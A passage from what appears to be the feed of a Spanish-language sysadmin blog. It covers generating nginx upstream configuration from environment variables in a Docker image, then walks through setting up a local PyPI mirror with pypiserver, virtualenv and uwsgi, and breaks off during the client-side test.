&lt;p&gt;Y el &lt;em&gt;script&lt;/em&gt; de generación solo tiene la responsabilidad de leer las variables de entorno y sacar la configuración por pantalla. Por simplicidad, estoy usando un &lt;em&gt;script&lt;/em&gt; en &lt;strong&gt;bash&lt;/strong&gt;, pero se podría hacer con otro lenguaje e incluso con un motor de plantillas. Me gusta especialmente la combinación &lt;strong&gt;python&lt;/strong&gt; + &lt;strong&gt;jinja2&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat config.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;upstream backend {&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; BACKEND in &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/,/ /g&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  server &lt;/span&gt;&lt;span class="nv"&gt;$BACKEND&lt;/span&gt;&lt;span class="s2"&gt;;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;\&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;

&lt;span class="s2"&gt;server {&lt;/span&gt;
&lt;span class="s2"&gt;    listen 80;&lt;/span&gt;
&lt;span class="s2"&gt;    server_name _;&lt;/span&gt;

&lt;span class="s2"&gt;    location / {&lt;/span&gt;
&lt;span class="s2"&gt;        proxy_pass http://backend;&lt;/span&gt;
&lt;span class="s2"&gt;    }&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que la configuración generada depende de la variable de entorno &lt;em&gt;BACKENDS&lt;/em&gt;, por ejemplo, con dos nodos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ &lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;server1:8080,server2:8080 ./config.sh 
upstream backend &lt;span class="o"&gt;{&lt;/span&gt;
    server server1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server server2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;

    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://backend&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; &lt;em&gt;entrypoint.sh&lt;/em&gt; llamará este otro &lt;em&gt;script&lt;/em&gt; y va a salvar esta configuración en algún sitio que &lt;strong&gt;nginx&lt;/strong&gt; pueda cargar, por ejemplo, en una carpeta incluida en la configuración principal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat nginx.conf 
worker_processes  &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections  &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente, solo nos queda poner todas las piezas en su sitio, mediante el &lt;em&gt;Dockerfile&lt;/em&gt; correspondiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx
COPY nginx.conf /etc/nginx/
COPY config.sh entrypoint.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/entrypoint.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente podemos crear un balanceador indicando simplemente los parámetros en el &lt;em&gt;docker run&lt;/em&gt;, previo &lt;em&gt;docker build&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ docker run -ti --rm -e &lt;span class="s2"&gt;&amp;quot;BACKENDS=server1:8080,server2:8080,server3:8080&amp;quot;&lt;/span&gt; balancer
...  
&lt;/pre&gt;&lt;/div&gt;</content><category term="docker"></category><category term="12factor"></category><category term="configuración"></category><category term="templating"></category></entry><entry><title>Un servidor pypi local</title><link href="http://www.linuxsysadmin.ml/2016/09/un-servidor-pypi-local.html" rel="alternate"></link><published>2016-09-05T08:00:00+02:00</published><updated>2016-09-05T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-09-05:/2016/09/un-servidor-pypi-local.html</id><summary type="html">&lt;p&gt;Cuando trabajamos con &lt;strong&gt;python&lt;/strong&gt;, muchas veces necesitamos instalar librerías con &lt;em&gt;pip&lt;/em&gt; o &lt;em&gt;easy_install&lt;/em&gt;. Dependiendo de la naturaleza de nuestros proyectos, las librerías suelen variar, pero siempre solemos utilizar los mismos. En estos casos puede ser útil tenerlos cerca, cacheados en un servidor en nuestra red local, para su rápido acceso …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando trabajamos con &lt;strong&gt;python&lt;/strong&gt;, muchas veces necesitamos instalar librerías con &lt;em&gt;pip&lt;/em&gt; o &lt;em&gt;easy_install&lt;/em&gt;. Dependiendo de la naturaleza de nuestros proyectos, las librerías suelen variar, pero siempre solemos utilizar los mismos. En estos casos puede ser útil tenerlos cerca, cacheados en un servidor en nuestra red local, para su rápido acceso.&lt;/p&gt;
&lt;p&gt;Para estos casos podemos montar un servidor exactamente igual que el de &lt;a href="https://pypi.python.org/pypi"&gt;PyPI&lt;/a&gt;, que se distribuye como una librería &lt;strong&gt;python&lt;/strong&gt; adicional, que nos ofrece una aplicación &lt;strong&gt;WSGI&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Nuestro despliegue es bastante básico; con un solo servidor nos basta, y puede estar compartido con otros usos. El único servicio que vamos a poner es un servidor &lt;strong&gt;WSGI&lt;/strong&gt; capaz de servir la aplicación. En nuestro caso vamos a usar &lt;strong&gt;uwsgi&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, creamos dos máquinas, una va a ser el servidor y la otra, un cliente de ejemplo que necesite los paquetes locales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME        STATE    IPV4      IPV6  AUTOSTART
----------------------------------------------
pyclient    RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     NO
pypiserver  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2  -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Montando el servidor&lt;/h2&gt;
&lt;p&gt;Como decisión de diseño, he optado por instalar el paquete &lt;em&gt;pypiserver&lt;/em&gt; en un &lt;em&gt;virtualenv&lt;/em&gt;, para no interferir con otros paquetes que pudiera haber en el servidor.&lt;/p&gt;
&lt;p&gt;Empezaremos creando una carpeta contenedora, en donde va a ir el &lt;em&gt;virtualenv&lt;/em&gt;, la aplicación y el índice de paquetes disponibles en el servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:~# mkdir /opt/pypi &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/pypi
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a descargar &lt;em&gt;virtualenv&lt;/em&gt;, sin instalarlo, para "usar y tirar". Para ello vamos a necesitar alguna herramienta para descargarlo de la red, por ejemplo, &lt;strong&gt;wget&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# apt-get install -y wget
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;13&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;9&lt;/span&gt;.875 kB de archivos.
Se utilizarán &lt;span class="m"&gt;35&lt;/span&gt;,7 MB de espacio de disco adicional después de esta operación.
...
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tanto la herramienta &lt;em&gt;virtualenv&lt;/em&gt; como la herramienta &lt;em&gt;pip&lt;/em&gt; que vamos a necesitar mas adelante, usan &lt;strong&gt;python&lt;/strong&gt;. Es un buen momento para asegurar que esté instalado, y si no lo está, lo instalamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# apt-get install -y python
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;12&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;4&lt;/span&gt;.991 kB de archivos.
Se utilizarán &lt;span class="m"&gt;21&lt;/span&gt;,2 MB de espacio de disco adicional después de esta operación.
...
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Descargamos el paquete &lt;em&gt;virtualenv&lt;/em&gt; y lo descomprimimos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# wget -q https://pypi.python.org/packages/5c/79/5dae7494b9f5ed061cff9a8ab8d6e1f02db352f3facf907d9eb614fb80e9/virtualenv-15.0.2.tar.gz
root@pypiserver:/opt/pypi# tar xzf virtualenv-15.0.2.tar.gz
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear el &lt;em&gt;virtualenv&lt;/em&gt; dentro de nuestra carpeta contenedora. Luego instalamos el paquete &lt;em&gt;pypiserver&lt;/em&gt;, previo activado del &lt;em&gt;virtualenv&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# ./virtualenv-15.0.2/virtualenv.py env
New python executable in /opt/pypi/env/bin/python
Installing setuptools, pip, wheel...done.
root@pypiserver:/opt/pypi# . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pypiserver:/opt/pypi# pip install pypiserver
Collecting pypiserver
  Downloading pypiserver-1.1.10-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;75kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 81kB 632kB/s
Installing collected packages: pypiserver
Successfully installed pypiserver-1.1.10
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pypiserver:/opt/pypi# deactivate
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos el &lt;em&gt;virtualenv&lt;/em&gt;. Si no ha habido problemas, y no lo pensamos reconstruir, es un buen momento para eliminar los &lt;em&gt;scripts&lt;/em&gt; de creación del mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# rm -R virtualenv-15.0.2*
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a hacer que nuestro servidor sirva los paquetes de una carpeta &lt;em&gt;packages&lt;/em&gt;, dentro de la carpeta contenedora. Como no existe esta carpeta &lt;em&gt;packages&lt;/em&gt;, la creamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# mkdir packages
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente creamos una aplicación &lt;strong&gt;WSGI&lt;/strong&gt; para poder servir nuestros paquetes. Realmente es una instancia de la aplicación que ofrece el paquete &lt;em&gt;pypiserver&lt;/em&gt;, con la única diferencia que consiste en especificar la raíz de los paquetes servidos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# cat app.py
import pypiserver
&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; pypiserver.app&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;root&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/opt/pypi/packages&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo único que queda es servir la aplicación en un servidor de nuestra preferencia. En mi caso he optado por &lt;strong&gt;uwsgi&lt;/strong&gt;, por lo que lo instalo. Se va a usar el modo &lt;em&gt;emperor&lt;/em&gt; por comodidad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# apt-get install -y uwsgi-emperor uwsgi-plugin-python
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;13&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;3&lt;/span&gt;.452 kB de archivos.
Se utilizarán &lt;span class="m"&gt;9&lt;/span&gt;.799 kB de espacio de disco adicional después de esta operación.
...
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De acuerdo con el modo &lt;em&gt;emperor&lt;/em&gt;, necesitamos declarar la aplicación mediante un fichero de configuración. Con esto el &lt;em&gt;emperor&lt;/em&gt; la tiene fichada y se encarga de mantenerla levantada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:/opt/pypi# cat /etc/uwsgi-emperor/vassals/pypiserver.ini
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :8080
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/pypi
&lt;span class="nv"&gt;virtualenv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/pypi/env/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:app
root@pypiserver:/opt/pypi#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo paquetes a nuestro servidor&lt;/h2&gt;
&lt;p&gt;Esta es la parte mas fácil de todas; basta con dejar nuestros paquetes &lt;strong&gt;python&lt;/strong&gt; en la carpeta &lt;em&gt;/opt/pypi/packages/&lt;/em&gt;. Así de fácil.&lt;/p&gt;
&lt;p&gt;El formato es cualquiera aceptado por &lt;em&gt;pip&lt;/em&gt; o &lt;em&gt;easy_install&lt;/em&gt;, pudiendo ser ficheros &lt;em&gt;.zip&lt;/em&gt;, &lt;em&gt;.egg&lt;/em&gt; o &lt;em&gt;.whl&lt;/em&gt; entre otros; pueden ser descargados, compilados, o creados por nosotros mismos.&lt;/p&gt;
&lt;p&gt;Para ver un ejemplo, voy a generar unos ficheros &lt;em&gt;.whl&lt;/em&gt;, mediante el uso de &lt;em&gt;pip&lt;/em&gt;. Esto nos garantiza que los tendremos cerca, pero que también van a estar ya compilados para la arquitectura concreta del servidor (presumiblemente la misma que van a usar los clientes).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:~# /opt/pypi/env/bin/pip wheel -w /opt/pypi/packages/ flask mongoengine
Collecting flask
  Downloading Flask-0.11.1-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;80kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 81kB 599kB/s
  Saved /opt/pypi/packages/Flask-0.11.1-py2.py3-none-any.whl
Collecting mongoengine
  Downloading mongoengine-0.10.6.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;346kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 348kB 560kB/s
Collecting click&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading click-6.6.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;283kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 286kB &lt;span class="m"&gt;2&lt;/span&gt;.0MB/s
Collecting Werkzeug&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.7 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading Werkzeug-0.11.10-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;306kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 307kB &lt;span class="m"&gt;1&lt;/span&gt;.0MB/s
  Saved /opt/pypi/packages/Werkzeug-0.11.10-py2.py3-none-any.whl
Collecting Jinja2&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.4 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading Jinja2-2.8-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;263kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 266kB &lt;span class="m"&gt;2&lt;/span&gt;.1MB/s
  Saved /opt/pypi/packages/Jinja2-2.8-py2.py3-none-any.whl
Collecting itsdangerous&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.21 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading itsdangerous-0.24.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;46kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 51kB &lt;span class="m"&gt;2&lt;/span&gt;.3MB/s
Collecting pymongo&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.1 &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading pymongo-3.2.2.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;504kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 512kB 657kB/s
Collecting MarkupSafe &lt;span class="o"&gt;(&lt;/span&gt;from Jinja2&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.4-&amp;gt;flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading MarkupSafe-0.23.tar.gz
Skipping flask, due to already being wheel.
Skipping Werkzeug, due to already being wheel.
Skipping Jinja2, due to already being wheel.
Building wheels &lt;span class="k"&gt;for&lt;/span&gt; collected packages: mongoengine, click, itsdangerous, pymongo, MarkupSafe
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; mongoengine ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /opt/pypi/packages
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; click ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /opt/pypi/packages
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; itsdangerous ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /opt/pypi/packages
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; pymongo ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /opt/pypi/packages
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; MarkupSafe ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /opt/pypi/packages
Successfully built mongoengine click itsdangerous pymongo MarkupSafe
root@pypiserver:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos ver que tenemos varios paquetes en la carpeta, algunos de ellos descargados ya en formato &lt;em&gt;wheel&lt;/em&gt; (por ejemplo &lt;em&gt;flask&lt;/em&gt;), y otros que se descargaron en formato &lt;em&gt;source&lt;/em&gt; y se compilaron (por ejemplo &lt;em&gt;pymongo&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pypiserver:~# ls -1 /opt/pypi/packages/
click-6.6-py2.py3-none-any.whl
Flask-0.11.1-py2.py3-none-any.whl
itsdangerous-0.24-py2-none-any.whl
Jinja2-2.8-py2.py3-none-any.whl
MarkupSafe-0.23-py2-none-any.whl
mongoengine-0.10.6-py2-none-any.whl
pymongo-3.2.2-cp27-cp27mu-linux_i686.whl
Werkzeug-0.11.10-py2.py3-none-any.whl
root@pypiserver:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Usando el servidor desde un cliente&lt;/h2&gt;
&lt;p&gt;Ya que vamos a trabajar con &lt;strong&gt;python&lt;/strong&gt;, aseguramos que lo tenemos instalado, o lo instalamos. Vamos a poner también la herramienta &lt;strong&gt;wget&lt;/strong&gt; porque la vamos a necesitar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pyclient:~# apt-get install -y wget python
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;25&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;14&lt;/span&gt;,9 MB de archivos.
Se utilizarán &lt;span class="m"&gt;56&lt;/span&gt;,9 MB de espacio de disco adicional después de esta operación.
...
root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Una prueba rápida: hay que ver que llegamos al servidor creado, y que este ofrece los paquetes en un formato adecuado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pyclient:~# wget -qO- http://10.0.0.2:8080/simple/&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &amp;lt;html&amp;gt;
        &amp;lt;head&amp;gt;
            &amp;lt;title&amp;gt;Simple Index&amp;lt;/title&amp;gt;
        &amp;lt;/head&amp;gt;
        &amp;lt;body&amp;gt;
            &amp;lt;h1&amp;gt;Simple Index&amp;lt;/h1&amp;gt;
                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Flask/&amp;quot;&lt;/span&gt;&amp;gt;Flask&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Jinja2/&amp;quot;&lt;/span&gt;&amp;gt;Jinja2&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MarkupSafe/&amp;quot;&lt;/span&gt;&amp;gt;MarkupSafe&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Werkzeug/&amp;quot;&lt;/span&gt;&amp;gt;Werkzeug&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;click/&amp;quot;&lt;/span&gt;&amp;gt;click&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;itsdangerous/&amp;quot;&lt;/span&gt;&amp;gt;itsdangerous&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
